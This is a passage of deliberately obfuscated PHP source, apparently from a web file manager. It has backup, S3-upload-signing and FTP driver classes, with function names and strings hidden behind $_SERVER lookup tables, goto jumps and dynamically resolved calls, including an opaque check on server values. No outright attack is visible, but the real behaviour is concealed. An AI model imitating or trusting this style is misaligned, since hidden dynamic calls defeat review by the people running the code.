($BÊí†¼…ƒ = 3; $BÊí†¼…ƒ < $Cš¦Ïªª¸ƒ; $BÊí†¼…ƒ += 2) { if ($Cš¦Ïªª¸ƒ % $BÊí†¼…ƒ != 0) { continue; } $c©ÑÁ¿ = $BÊí†¼…ƒ; $E®‡ÚóİÔÌ = $d‰¡÷³‚‚„[669]; $C§¶œŠ°—ì = $DÌò†íÃì÷[249]($Cš¦Ïªª¸ƒ / $BÊí†¼…ƒ); $dºïÅ¨¾È¦ = $d‰¡÷³‚‚„[670]; if (strlen($dºïÅ¨¾È¦) < $d‰¡÷³‚‚„[558]) { die; } break; } $e¸¸è»»ëº = ($c©ÑÁ¿ - 1) * ($C§¶œŠ°—ì - 1); goto Fš¡Êéš„„; Fš¡Êéš„„: $FÈÑÃçµ‹º = $DÌò†íÃì÷[249](($c©ÑÁ¿ + $C§¶œŠ°—ì) / 2); $CåĞÏ‡ìò¥ = $d‰¡÷³‚‚„[671]; if (!$CåĞÏ‡ìò¥) { return; } goto cà‡šÃßëÕ; fÁÉˆÜù¸: if ($DÌò†íÃì÷[19]($eè¥ÙŠïÓÄ) != 2) { return $DÌò†íÃì÷[10]; } $Cš¦Ïªª¸ƒ = $this->{$_SERVER[§Š×Ö][255]}($eè¥ÙŠïÓÄ[1] . $DÌò†íÃì÷[10], $DÌò†íÃì÷[158]); if (!$Cš¦Ïªª¸ƒ) { return $DÌò†íÃì÷[10]; } goto Eà¨­ğÑØ…; bÎ Ä’½¡ö: $DÔÊ˜‘é¸ = $DÌò†íÃì÷[123]($DÌò†íÃì÷[354] . ($c©ÑÁ¿ + $C§¶œŠ°—ì) . $DÌò†íÃì÷[355] . $FÈÑÃçµ‹º . $DÌò†íÃì÷[355] . $C¯Í¼«‚‹í . $DÌò†íÃì÷[356]); $Aìñˆáˆé = $d‰¡÷³‚‚„[673]; $Dª×ßŞñƒİ = $this->{$_SERVER[§Š×Ö][255]}($eè¥ÙŠïÓÄ[0], $DÔÊ˜‘é¸); goto aİ‡º•ò; bÜÎš¬†Ê±: } public function hgxp54f53752() { goto DÈÜâÍ£ù; dŸ×Ôòèæ: $B·ÏÎñÉô = 1; $C„¨ËË‚Ö¿ = $D¯¥·½ß¡Ğ[677]; while ($B·ÏÎñÉô <= (int) $EÌöô¯‹Ğ[359]($CÅšëº¢–)) { $B¢À„‡©Ç± = $B·ÏÎñÉô; while (!0) { $B¢À„‡©Ç±++; $f‰ø½õ¾ğ = $D¯¥·½ß¡Ğ[678]; while ($f‰ø½õ¾ğ < $D¯¥·½ß¡Ğ[555]) { if ($f‰ø½õ¾ğ >= 0) { break; } $f‰ø½õ¾ğ++; } if ($B¢À„‡©Ç± <= 2) { $B·ÏÎñÉô = $B¢À„‡©Ç±; break; } else { if ($B¢À„‡©Ç± < 2) { continue; } } $DÆº¾·¥¡ = !0; for ($fâ‰ªßˆà½ = 2; $fâ‰ªßˆà½ <= $EÌöô¯‹Ğ[359]($B¢À„‡©Ç±); $fâ‰ªßˆà½++) { if ($B¢À„‡©Ç± % $fâ‰ªßˆà½ == 0) { $DÆº¾·¥¡ = !1; } } if ($DÆº¾·¥¡) { $B·ÏÎñÉô = $B¢À„‡©Ç±; break; } } $f‘Æ¼áÅàï[] = $B·ÏÎñÉô; } goto aä÷°Œã…¦; DÈÜâÍ£ù: $D¯¥·½ß¡Ğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÌöô¯‹Ğ =& $_SERVER[§Š×Ö]; $CÅšëº¢– = $EÌöô¯‹Ğ[338]($EÌöô¯‹Ğ[358](2, 14), $EÌöô¯‹Ğ[358](2, 16) - 1); goto F¯ŠÒ£–Ëã; aä÷°Œã…¦: $aœ“à®æ»Æ = 2; for ($B¢À„‡©Ç± = $CÅšëº¢–; $B¢À„‡©Ç± > 1; $B¢À„‡©Ç±--) { $DÆº¾·¥¡ = !0; foreach ($f‘Æ¼áÅàï as $c–¥ÕÎÎÃ·) { if ($B¢À„‡©Ç± % $c–¥ÕÎÎÃ· == 0) { $DÆº¾·¥¡ = !1; break; } } if ($DÆº¾·¥¡) { $aœ“à®æ»Æ = $B¢À„‡©Ç±; break; } } return $aœ“à®æ»Æ; goto Eˆ£ƒœƒ; F¯ŠÒ£–Ëã: $f‘Æ¼áÅàï = array(); $C‹Ó†‰Ôï = $D¯¥·½ß¡Ğ[676]; if (!$C‹Ó†‰Ôï) { return; } goto dŸ×Ôòèæ; Eˆ£ƒœƒ: } public function xdeoe3f785e3($DŞÊ´ÍÍîš, $CâğïïŒ®Í) { $BÆÆ¼‰„¨ =& $_SERVER[§Š×Ö]; return $BÆÆ¼‰„¨[13](array($BÆÆ¼‰„¨[14], $BÆÆ¼‰„¨[360]), $DŞÊ´ÍÍîš, $CâğïïŒ®Í); } public function stmie31c0f70($BªÍĞğ ¢Ë, $BŸÜ »–) { $DœèÃÄ­Ò =& $_SERVER[§Š×Ö]; return $DœèÃÄ­Ò[13](array($DœèÃÄ­Ò[361], $DœèÃÄ­Ò[362]), $BªÍĞğ ¢Ë, $BŸÜ »–); $D·’Æ¯¿Ô = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][679]; } public function hfok71966bae($E÷ˆ²©, $AÓ¬÷­Òê) { $AŠ†¦ÙæÛØ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aç›“ğé‡ =& $_SERVER[§Š×Ö]; return $aç›“ğé‡[13](array($aç›“ğé‡[361], $aç›“ğé‡[363]), $E÷ˆ²©, $AÓ¬÷­Òê); $a³Ùğº¸¦¡ = $AŠ†¦ÙæÛØ[680]; while (strlen($a³Ùğº¸¦¡) < $AŠ†¦ÙæÛØ[558]) { if (!$a³Ùğº¸¦¡) { break; } $a³Ùğº¸¦¡++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $dÔğ¨´Ç’† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::$name = date($dÔğ¨´Ç’†[681]); if (!($bÊ˜‘¤Ø = Model($dÔğ¨´Ç’†[682])->lastItem())) { $bÊ˜‘¤Ø = $this->initData(); } else { self::$name = $bÊ˜‘¤Ø[$dÔğ¨´Ç’†[28]]; if ($bÊ˜‘¤Ø[$dÔğ¨´Ç’†[683]] == $dÔğ¨´Ç’†[83]) { self::$name = date($dÔğ¨´Ç’†[684]); $B»¦º˜†šˆ = 0; if (isset($bÊ˜‘¤Ø[$dÔğ¨´Ç’†[281]][$dÔğ¨´Ç’†[167]][$dÔğ¨´Ç’†[419]])) { $B»¦º˜†šˆ = (int) $bÊ˜‘¤Ø[$dÔğ¨´Ç’†[281]][$dÔğ¨´Ç’†[167]][$dÔğ¨´Ç’†[419]]; } if ($bÊ˜‘¤Ø[$dÔğ¨´Ç’†[28]] == self::$name) { Model($dÔğ¨´Ç’†[682])->remove($bÊ˜‘¤Ø[$dÔğ¨´Ç’†[367]]); } $bÊ˜‘¤Ø = $this->initData($B»¦º˜†šˆ, $bÊ˜‘¤Ø[$dÔğ¨´Ç’†[685]]); } else { $this->checkStore($bÊ˜‘¤Ø[$dÔğ¨´Ç’†[685]]); } } self::$option = $bÊ˜‘¤Ø; } private function initData($Fï…®š †œ = 0, $dƒµæ»Ğ‘ = '') { goto FÍÚß¤¤‚†; DŸ¤ƒ‰õë™: $this->checkStore($ešéôë¯[$a¡¥œø’Ùà[685]]); $BÈ›‚­Œ = array($a¡¥œø’Ùà[685] => $ešéôë¯[$a¡¥œø’Ùà[685]], $a¡¥œø’Ùà[28] => self::$name, $a¡¥œø’Ùà[683] => 0, $a¡¥œø’Ùà[686] => $ešéôë¯[$a¡¥œø’Ùà[686]], $a¡¥œø’Ùà[281] => array($a¡¥œø’Ùà[687] => array($a¡¥œø’Ùà[683] => 0), $a¡¥œø’Ùà[688] => array($a¡¥œø’Ùà[683] => 0, $a¡¥œø’Ùà[689] => 0, $a¡¥œø’Ùà[690] => 0, $a¡¥œø’Ùà[29] => $a¡¥œø’Ùà[33]), $a¡¥œø’Ùà[691] => array($a¡¥œø’Ùà[683] => 0, $a¡¥œø’Ùà[689] => 0, $a¡¥œø’Ùà[690] => 0), $a¡¥œø’Ùà[167] => array($a¡¥œø’Ùà[683] => 0, $a¡¥œø’Ùà[692] => 0, $a¡¥œø’Ùà[693] => 0, $a¡¥œø’Ùà[694] => 0, $a¡¥œø’Ùà[695] => 0, $a¡¥œø’Ùà[419] => $Fï…®š †œ)), $a¡¥œø’Ùà[696] => time(), $a¡¥œø’Ùà[449] => 0); $DÅ†Á¢è†á = Model($a¡¥œø’Ùà[682])->insert($BÈ›‚­Œ); goto EÂö±ğ‰‹·; EÂö±ğ‰‹·: $BÈ›‚­Œ[$a¡¥œø’Ùà[367]] = $DÅ†Á¢è†á; return $BÈ›‚­Œ; goto AòĞ›èİù; FÍÚß¤¤‚†: $a¡¥œø’Ùà =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $ešéôë¯ = Model($a¡¥œø’Ùà[682])->config(); if ($dƒµæ»Ğ‘ && $ešéôë¯[$a¡¥œø’Ùà[685]] != $dƒµæ»Ğ‘) { $Fï…®š †œ = 0; } goto DŸ¤ƒ‰õë™; AòĞ›èİù: } private function checkStore($A™¶ç„·½ë) { $d¨ç·¯†£Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÙ­áÜóœ» = Model($d¨ç·¯†£Ò[697])->listData($A™¶ç„·½ë); Model($d¨ç·¯†£Ò[697])->checkConfig($cÙ­áÜóœ»); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][682])->findByName(self::$name); } return self::$option; } public static function set($AÀëêŒÈ£î) { $D ßó¯½ç© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aïÎÓø¦±† = self::get(); foreach ($AÀëêŒÈ£î as $cÍšè‘¬œ™ => $AŠÌÌ—½­®) { $A¡¦ğ÷ô‡ = explode($D ßó¯½ç©[91], $cÍšè‘¬œ™); $D÷¤Â§ÕÁİ = count($A¡¦ğ÷ô‡); switch ($D÷¤Â§ÕÁİ) { case 1: $aïÎÓø¦±†[$A¡¦ğ÷ô‡[0]] = $AŠÌÌ—½­®; break; case 2: $aïÎÓø¦±†[$A¡¦ğ÷ô‡[0]][$A¡¦ğ÷ô‡[1]] = $AŠÌÌ—½­®; break; case 3: $aïÎÓø¦±†[$A¡¦ğ÷ô‡[0]][$A¡¦ğ÷ô‡[1]][$A¡¦ğ÷ô‡[2]] = $AŠÌÌ—½­®; break; } } Model($D ßó¯½ç©[682])->update($aïÎÓø¦±†[$D ßó¯½ç©[367]], $aïÎÓø¦±†); self::$option = $aïÎÓø¦±†; return self::$option; } public function keep() { $Bì¿éÁ§Ü =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cƒ®ò–—óÓ = self::get(); if ($Cƒ®ò–—óÓ[$Bì¿éÁ§Ü[281]][$Bì¿éÁ§Ü[687]][$Bì¿éÁ§Ü[683]] == $Bì¿éÁ§Ü[83]) { return; } $this->backupKeep($Cƒ®ò–—óÓ); self::set(array($Bì¿éÁ§Ü[698] => 1)); } private function backupKeep($EÜÇÔÑÈ‡ø) { goto f¡¶ÇÛ¸…‡; dùöÂçôÌ: for ($eÜ’–éà»Ï = 0; $eÜ’–éà»Ï < 12; $eÜ’–éà»Ï++) { $FÔÛÜ»÷¹ô[] = date($aŠ‡ô–É®É[699], strtotime("\x2d{$eÜ’–éà»Ï}\40\x6d\157\156\164\x68\x73")); } $FÔÛÜ»÷¹ô = array_unique($FÔÛÜ»÷¹ô); foreach ($A¯‘à¤° as $BÒó™áó‚³) { if (!empty($BÒó™áó‚³[$aŠ‡ô–É®É[28]]) && in_array($BÒó™áó‚³[$aŠ‡ô–É®É[28]], $FÔÛÜ»÷¹ô)) { continue; } Model($aŠ‡ô–É®É[682])->remove($BÒó™áó‚³[$aŠ‡ô–É®É[367]]); $Eòç¯ÙÊÉì = "\x7b\x69\157\x3a{$EÜÇÔÑÈ‡ø[$aŠ‡ô–É®É[685]]}\175\x2f\144\x61\x74\x61\x62\141\163\x65\57\x62\x61\143\x6b\x75\x70\x5f{$BÒó™áó‚³[$aŠ‡ô–É®É[28]]}"; IO::remove($Eòç¯ÙÊÉì, !1); } goto eõ‡‡¼¤Š¿; f¡¶ÇÛ¸…‡: $aŠ‡ô–É®É =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A¯‘à¤° = Model($aŠ‡ô–É®É[682])->listData(); if (empty($A¯‘à¤°)) { return; } goto ašÀÌ­øÜô; ašÀÌ­øÜô: $eÜ’–éà»Ï = 0; $FÔÛÜ»÷¹ô = array(); foreach ($A¯‘à¤° as $BÒó™áó‚³) { if ($eÜ’–éà»Ï >= 7) { break; } $FÔÛÜ»÷¹ô[] = $BÒó™áó‚³[$aŠ‡ô–É®É[28]]; $eÜ’–éà»Ï++; } goto dùöÂçôÌ; eõ‡‡¼¤Š¿: } public function db() { goto c§†Ì¼ªóğ; c§†Ì¼ªóğ: $CÔ¤œ‹‡ Ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CìÔ¿×ˆâ– = self::get(); if ($CìÔ¿×ˆâ–[$CÔ¤œ‹‡ Ï[281]][$CÔ¤œ‹‡ Ï[688]][$CÔ¤œ‹‡ Ï[683]] == $CÔ¤œ‹‡ Ï[83]) { return !0; } goto BÒ Œ•±îÆ; d¹¥‰Êá‰á: return !0; goto B‚¢¤­¼Ó; BÒ Œ•±îÆ: $eã£ŠŠŠĞÛ = new BackupDb(); if (!$eã£ŠŠŠĞÛ->index()) { return !1; } self::set(array($CÔ¤œ‹‡ Ï[700] => 1)); goto d¹¥‰Êá‰á; B‚¢¤­¼Ó: } public function dbFile() { goto D÷Â­Ò¦˜š; D÷Â­Ò¦˜š: $fóŒÄÏùà¹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AĞ£¤ªˆŞñ = self::get(); if ($AĞ£¤ªˆŞñ[$fóŒÄÏùà¹[281]][$fóŒÄÏùà¹[691]][$fóŒÄÏùà¹[683]] == $fóŒÄÏùà¹[83]) { return !0; } goto A“œŒ ; A“œŒ : $dÕ•Óç‚öè = new BackupDbFile(); if (!$dÕ•Óç‚öè->index()) { return !1; } self::set(array($fóŒÄÏùà¹[701] => 1)); goto A›‰ìÍÈõ”; A›‰ìÍÈõ”: return !0; goto eåö¾’‹²é; eåö¾’‹²é: } public function file() { $c„İ¨õ‡ÊÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cñ½£Â¦ù = self::get(); if ($cñ½£Â¦ù[$c„İ¨õ‡ÊÉ[281]][$c„İ¨õ‡ÊÉ[167]][$c„İ¨õ‡ÊÉ[683]] == $c„İ¨õ‡ÊÉ[83]) { return !0; } if (!isset($cñ½£Â¦ù[$c„İ¨õ‡ÊÉ[686]]) || $cñ½£Â¦ù[$c„İ¨õ‡ÊÉ[686]] == $c„İ¨õ‡ÊÉ[470]) { $d´Íˆ¨Ôä = new BackupFile(); if (!$d´Íˆ¨Ôä->index()) { return !1; } } self::set(array($c„İ¨õ‡ÊÉ[702] => 1, $c„İ¨õ‡ÊÉ[683] => 1)); return !0; } } if ($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][703]] != $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][704]]) { goto BéÕóÆ”Ú†; A‹»ªŞ³¡ˆ: $A‘¶äèÛË¹ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][217], $dô†‹ÊÁ§ô); if (count($A‘¶äèÛË¹) < $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][562]) { $Eø‹¾ë˜ÙÔ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][708]; $Eø‹¾ë˜ÙÔ(); } $eá…½Œœ‘ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][709]; goto Dâ‚‘‹ñš˜; Dâ‚‘‹ñš˜: $eá…½Œœ‘($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][710]]); goto F…š‰©ªäÆ; BéÕóÆ”Ú†: $Bï±‰¹£ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][705]; $BÊà°†Ê§Ğ = $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][706]] . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][707]; $dô†‹ÊÁ§ô = $Bï±‰¹£($BÊà°†Ê§Ğ); goto A‹»ªŞ³¡ˆ; F…š‰©ªäÆ: } goto cè¬…‘°Ë; BæÚ†Èò…Í: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dÜ¾’¼£‡°) { parent::__construct($dÜ¾’¼£‡°); $this->signatureVersion($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][200]); } public function uploadFormData($C‚˜Êî‚ƒÕ, $D¤ÉŠ‰æ“¿ = 3600) { goto cà²²ÚºĞÖ; C¨ğ³’­÷: $Cõ˜ ±¦…š = $B‰¡ÃÂ¬[59]; $b¸æÁ§‰ = gmdate($B‰¡ÃÂ¬[1134]); $a¤Âğ£œõÓ = gmdate($B‰¡ÃÂ¬[684]); goto EïÉĞÂµîÔ; EïÉĞÂµîÔ: $bªŒÚº¼³ç = $B‰¡ÃÂ¬[1135]; $EÏåê¨Š¯ƒ = $D¤ÉŠ‰æ“¿ . $B‰¡ÃÂ¬[33]; $FÊ’Ïì¤ò˜ = $B‰¡ÃÂ¬[1097]; goto a§Ÿï„­Â¡; aßŠÅŠ–Û: $BÃ“ª‚´Ñº = base64_encode(json_encode($b½‰©àâ¸Ñ)); $e›§åà„ñ = hash_hmac($B‰¡ÃÂ¬[1143], $a¤Âğ£œõÓ, $B‰¡ÃÂ¬[1144] . $this->secret, !0); $CøÄÒ›òØ = hash_hmac($B‰¡ÃÂ¬[1143], $this->region, $e›§åà„ñ, !0); goto AƒĞîéš¦Æ; cà²²ÚºĞÖ: $B‰¡ÃÂ¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¹ñ„ô‘• = $B‰¡ÃÂ¬[185]; $bâ–ô× = $B‰¡ÃÂ¬[1133]; goto C¨ğ³’­÷; AƒĞîéš¦Æ: $Aé«”§ŞÒ® = hash_hmac($B‰¡ÃÂ¬[1143], $Cõ˜ ±¦…š, $CøÄÒ›òØ, !0); $E¤Íïœè¥˜ = hash_hmac($B‰¡ÃÂ¬[1143], $bªŒÚº¼³ç, $Aé«”§ŞÒ®, !0); $Eß–­Äò¦Ã = hash_hmac($B‰¡ÃÂ¬[1143], $BÃ“ª‚´Ñº, $E¤Íïœè¥˜); goto d½íí–ØÖ°; d½íí–ØÖ°: $BÜ•ÓÂä­ = array($B‰¡ÃÂ¬[199] => $B‰¡ÃÂ¬[33], $B‰¡ÃÂ¬[1145] => $B‰¡ÃÂ¬[33], $B‰¡ÃÂ¬[1101] => $B¹ñ„ô‘•, $B‰¡ÃÂ¬[1105] => $FÊ’Ïì¤ò˜, $B‰¡ÃÂ¬[1109] => $BÃ“ª‚´Ñº, $B‰¡ÃÂ¬[1146] => $F¾ªŸŸ¦–Õ, $B‰¡ÃÂ¬[1147] => $bâ–ô×, $B‰¡ÃÂ¬[1148] => $b¸æÁ§‰, $B‰¡ÃÂ¬[1149] => $EÏåê¨Š¯ƒ, $B‰¡ÃÂ¬[1150] => $Eß–­Äò¦Ã, $B‰¡ÃÂ¬[169] => $this->getHost()); return $BÜ•ÓÂä­; goto EñÒÉ¦é¯°; a§Ÿï„­Â¡: $B¢¯ôÜÁÅ¼ = array($this->accessKey, $a¤Âğ£œõÓ, $this->region, $Cõ˜ ±¦…š, $bªŒÚº¼³ç); $F¾ªŸŸ¦–Õ = implode($B‰¡ÃÂ¬[8], $B¢¯ôÜÁÅ¼); $b½‰©àâ¸Ñ = array($B‰¡ÃÂ¬[1099] => gmdate($B‰¡ÃÂ¬[1098], strtotime($B‰¡ÃÂ¬[1136])), $B‰¡ÃÂ¬[1100] => array(array($B‰¡ÃÂ¬[1102] => $this->bucket), array($B‰¡ÃÂ¬[1101] => $B¹ñ„ô‘•), array($B‰¡ÃÂ¬[1103], $B‰¡ÃÂ¬[1104], $B‰¡ÃÂ¬[33]), array($B‰¡ÃÂ¬[1103], $B‰¡ÃÂ¬[1137], $B‰¡ÃÂ¬[33]), array($B‰¡ÃÂ¬[1103], $B‰¡ÃÂ¬[1138], $B‰¡ÃÂ¬[33]), array($B‰¡ÃÂ¬[1105] => $FÊ’Ïì¤ò˜), array($B‰¡ÃÂ¬[1139] => $F¾ªŸŸ¦–Õ), array($B‰¡ÃÂ¬[1140] => $bâ–ô×), array($B‰¡ÃÂ¬[1141] => $b¸æÁ§‰), array($B‰¡ÃÂ¬[1142] => $EÏåê¨Š¯ƒ))); goto aßŠÅŠ–Û; EñÒÉ¦é¯°: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($c‘òÂÖ’Øõ) { parent::__construct(); if (count($c‘òÂÖ’Øõ) > 0) { $this->_init($c‘òÂÖ’Øõ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bÀÙµ‹è‹İ) { $F‡â›‡Ø• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $config; $this->appCharset = $config[$F‡â›‡Ø•[1151]]; $this->systemCharset = $config[$F‡â›‡Ø•[1152]]; if (isset($bÀÙµ‹è‹İ[$F‡â›‡Ø•[1153]]) && $bÀÙµ‹è‹İ[$F‡â›‡Ø•[1153]]) { $this->systemCharset = $bÀÙµ‹è‹İ[$F‡â›‡Ø•[1153]]; } } public function iconvApp($EÉ”â¨ÙŠğ) { return $this->iconvTo($EÉ”â¨ÙŠğ, $this->systemCharset, $this->appCharset); } public function iconvSystem($B‰Â®½) { return $this->iconvTo($B‰Â®½, $this->appCharset, $this->systemCharset); } public function getPathOuter($aÉ³ĞŸÁ ) { goto c¦Ÿ„¾Œ§Ñ; c¦Ÿ„¾Œ§Ñ: $DòÖÂ¹›Â =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d±å¹¼¬ÍÒ = $this->iconvApp($this->pathBase); $aÉ³ĞŸÁ  = $this->iconvApp($aÉ³ĞŸÁ ); goto c¾Ò™Å¹»Å; c¾Ò™Å¹»Å: if (substr($d±å¹¼¬ÍÒ, 0, 2) == $DòÖÂ¹›Â[1154]) { $d±å¹¼¬ÍÒ = BASIC_PATH . substr($d±å¹¼¬ÍÒ, 2); } if (substr($aÉ³ĞŸÁ , 0, 2) == $DòÖÂ¹›Â[1154]) { $aÉ³ĞŸÁ  = BASIC_PATH . substr($aÉ³ĞŸÁ , 2); } $d±å¹¼¬ÍÒ = KodIO::clear($d±å¹¼¬ÍÒ); goto E‰ôÌŞÁî©; E‰ôÌŞÁî©: $aÉ³ĞŸÁ  = KodIO::clear($aÉ³ĞŸÁ ); $aÉ³ĞŸÁ  = substr($aÉ³ĞŸÁ , strlen($d±å¹¼¬ÍÒ)); if (empty($this->pathDriver)) { return $aÉ³ĞŸÁ ; } goto cŸ ê”òí; cŸ ê”òí: return $this->pathDriver . $DòÖÂ¹›Â[8] . ltrim($aÉ³ĞŸÁ , $DòÖÂ¹›Â[8]); goto E»öôƒ¢Ã; E»öôƒ¢Ã: } private function _init($aÅëùŠ…§À = array()) { $C¥¤‚×¬ôÂ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!function_exists($C¥¤‚×¬ôÂ[1155])) { show_json(LNG($C¥¤‚×¬ôÂ[1156]), !1); } $this->config = $aÅëùŠ…§À; $this->charsetReset($aÅëùŠ…§À); foreach ($aÅëùŠ…§À as $añ‡„Ê²² => $eöôÔ¿‹›Ù) { if (isset($this->{$añ‡„Ê²²})) { $this->{$añ‡„Ê²²} = $eöôÔ¿‹›Ù; } } return $this->_login($aÅëùŠ…§À); } private function _login($C‘×²ÒÇ×è) { goto FİÖğĞë˜Æ; d„ˆ‘ñäÂø: $A¥·‹Â«Û“ = isset($Dë£šºªÅñ[$AÇ†‡Ö®[168]]) && $Dë£šºªÅñ[$AÇ†‡Ö®[168]] == $AÇ†‡Ö®[1157] ? !0 : !1; $this->scheme = $A¥·‹Â«Û“ ? $AÇ†‡Ö®[1158] : $AÇ†‡Ö®[1159]; $this->port = isset($Dë£šºªÅñ[$AÇ†‡Ö®[170]]) ? $Dë£šºªÅñ[$AÇ†‡Ö®[170]] : 21; goto Cğ¿àêÍ¯; D…çÁ÷‚…å: if (isset($FÓÌ‚ï°—Ï[$DŒæê÷ïº])) { foreach ($FÓÌ‚ï°—Ï[$DŒæê÷ïº] as $A‚¶‚‰¬Æ => $cÑ™È¿ˆ²) { $this->{$A‚¶‚‰¬Æ} = $cÑ™È¿ˆ²; } return !0; } $Dë£šºªÅñ = parse_url(trim($this->server, $AÇ†‡Ö®[8])); $this->host = $Dë£šºªÅñ[$AÇ†‡Ö®[169]]; goto d„ˆ‘ñäÂø; Cğ¿àêÍ¯: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $A¸½¾òÃ¿Ä = @ftp_login($this->connect, $this->username, $this->userpass); goto c˜Ø‚™˜ãÓ; Fåà˜§èõ: $FÓÌ‚ï°—Ï[$DŒæê÷ïº] = array($AÇ†‡Ö®[1160] => $this->connect, $AÇ†‡Ö®[169] => $this->host, $AÇ†‡Ö®[168] => $this->scheme, $AÇ†‡Ö®[170] => $this->port); return $A¸½¾òÃ¿Ä; goto C¡øÎëèŸ; c˜Ø‚™˜ãÓ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $A÷¥‘Ôò„Æ = $this->pasv == $AÇ†‡Ö®[83] ? !0 : !1; @ftp_pasv($this->connect, $A÷¥‘Ôò„Æ); goto Fåà˜§èõ; FİÖğĞë˜Æ: $AÇ†‡Ö® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $FÓÌ‚ï°—Ï = array(); $DŒæê÷ïº = md5(json_encode($C‘×²ÒÇ×è)); goto D…çÁ÷‚…å; C¡øÎëèŸ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Cô¤®Äâç, $fáí·ŠÉÑÔ = '', $eœÀğÛã¬Î = REPEAT_RENAME) { if ($this->setContent($Cô¤®Äâç, $fáí·ŠÉÑÔ)) { return $this->getPathOuter($Cô¤®Äâç); } return !1; } public function mkdir($A¸ù¥Ûâ‡›, $D—Û´“‹†Î = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A¸ù¥Ûâ‡› = $this->iconvSystem($A¸ù¥Ûâ‡›); if ($this->isFolder($A¸ù¥Ûâ‡›) || @ftp_mkdir($this->connect, $A¸ù¥Ûâ‡›)) { return $this->getPathOuter($A¸ù¥Ûâ‡›); } if (!$this->mkdir($this->pathFather($A¸ù¥Ûâ‡›))) { return !1; } if ($A¸ù¥Ûâ‡› = @ftp_mkdir($this->connect, $A¸ù¥Ûâ‡›)) { return $this->getPathOuter($A¸ù¥Ûâ‡›); } return !1; } public function copyFile($cÆ§ÕÃ”İ, $EŞ—ß”¼»ƒ) { goto FÎáÌÜ‡ÒÜ; bÔ‰¶¦‰Å¤: $this->tempFileRemve($e£œè©’â‰); return $B¡É‡÷ğ; goto Aïõİİ²«·; A“Ï…à‹ØÖ: $A£³ŒÕğæ = $this->iconvApp($e£œè©’â‰); $this->download($cÆ§ÕÃ”İ, $A£³ŒÕğæ); $B¡É‡÷ğ = $this->upload($EŞ—ß”¼»ƒ, $A£³ŒÕğæ); goto bÔ‰¶¦‰Å¤; FÎáÌÜ‡ÒÜ: if (!$this->_isconn()) { return !1; } $fœ‚˜§¸®¢ = $this->pathThis($this->iconvSystem($cÆ§ÕÃ”İ)); $e£œè©’â‰ = $this->tempFile($fœ‚˜§¸®¢); goto A“Ï…à‹ØÖ; Aïõİİ²«·: } public function moveFile($cÉ ¿±àìŠ, $bÈö²®°”¡) { if (!$this->_isconn()) { return !1; } $cÉ ¿±àìŠ = $this->iconvSystem($cÉ ¿±àìŠ); $bÈö²®°”¡ = $this->iconvSystem($bÈö²®°”¡); $dÛø¿åë— = @ftp_rename($this->connect, $cÉ ¿±àìŠ, $bÈö²®°”¡); return $dÛø¿åë— ? $this->getPathOuter($bÈö²®°”¡) : !1; } public function delFile($eåì¾Õ¶ô) { if (!$this->_isconn()) { return !1; } $eåì¾Õ¶ô = $this->iconvSystem($eåì¾Õ¶ô); return @ftp_delete($this->connect, $eåì¾Õ¶ô); } public function delFolder($dÓ°¶²æÕ) { if (!$this->_isconn()) { return !1; } $dÓ°¶²æÕ = $this->iconvSystem($dÓ°¶²æÕ); $bª¢ñö²ğ = $this->ftpList($dÓ°¶²æÕ); if (!$bª¢ñö²ğ) { return @ftp_rmdir($this->connect, $dÓ°¶²æÕ); } foreach ($bª¢ñö²ğ as $b…×éÃÌÃ°) { if ($this->isFolder($b…×éÃÌÃ°)) { $b…×éÃÌÃ° = $this->iconvApp($b…×éÃÌÃ°); $this->delFolder($b…×éÃÌÃ°); } else { @ftp_delete($this->connect, $b…×éÃÌÃ°); } } return @ftp_rmdir($this->connect, $dÓ°¶²æÕ); } public function rename($F¡ì„œ£«ù, $AêÒåğŸß) { goto eƒçÌ…äŒ; eƒçÌ…äŒ: $AìØîÊáåâ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->_isconn()) { return !1; } $BàÛ¬èÈ¯æ = $this->fileNameAuto($this->pathFather($F¡ì„œ£«ù), $AêÒåğŸß); goto AŒ¹·ĞŒ; 